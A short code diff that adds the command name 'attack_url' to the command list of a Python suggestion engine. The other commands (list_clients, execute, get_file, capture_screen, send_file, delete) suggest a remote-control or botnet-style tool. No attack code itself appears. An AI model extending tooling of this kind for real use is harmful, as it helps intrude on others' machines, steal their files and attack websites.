@@ -9,7 +9,7 @@ class SuggestionEngine:
         self.commands = [
             "start_server", "stop_server", "list_clients", "execute", "get_file",
             "get_directory", "list_directory", "delete", "capture_screen",
-            "add_firewall_rule", "get_files_by_extension", "send_file", "help_cmd", "exit"
+            "add_firewall_rule", "get_files_by_extension", "send_file", "attack_url", "help_cmd", "exit"
         ]
     
     def suggest(self, invalid_command: str) -> str:
